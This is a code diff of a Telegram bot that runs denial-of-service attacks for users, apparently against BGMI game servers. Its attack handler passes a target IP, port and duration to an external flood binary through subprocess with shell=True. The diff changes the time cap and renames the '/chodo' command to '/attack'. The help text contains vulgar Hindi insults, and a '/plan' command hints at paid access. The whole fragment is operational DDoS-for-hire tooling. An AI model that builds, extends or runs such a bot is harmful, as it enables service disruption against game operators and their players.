@@ -291,8 +291,8 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 300:
-                response = "Error: Time interval must be less than 300"
+            if time > 180:
+                response = "Error: Time interval must be less than 180"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
@@ -301,7 +301,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./2111 {target} {port} {time} 800"
+                    full_command = f"./ranbal {target} {port} {time} 800"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
@@ -310,7 +310,7 @@ def handle_attack(message):
                 finally:
                     attack_running = False  # Reset the attack state
         else:
-            response = "Usage: /chodo <target> <port> <time>"
+            response = "Usage: /attack <target> <port> <time>"
     else:
         response = "Nhi milega GROUP per Free hai Wha use krle."
 
@@ -343,7 +343,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''
-💥 /chodo : 😫BGMI WALO KI MAA KO CHODO🥵. 
+💥 /attack : 😫BGMI WALO KI MAA KO CHODO🥵. 
 💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
 💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
 💥 /plan : 💵SABKE BSS KA BAT HAI💵.
